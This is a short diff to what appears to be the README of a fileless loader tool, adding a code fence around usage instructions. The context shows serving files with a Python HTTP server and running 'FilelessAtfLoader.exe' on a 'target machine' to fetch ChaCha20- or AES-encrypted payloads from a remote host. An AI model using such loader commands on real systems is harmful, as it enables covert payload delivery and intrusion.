@@ -73,6 +73,7 @@ python3 -m http.server 8080
 ```
 
 ### ChaCha20 - On Windows (target machine)
+```cmd
 FilelessAtfLoader.exe 192.168.1.100 8080 /cipher_chacha20.bin /key_chacha20.bin
 
 REM AES - On Windows (target machine)
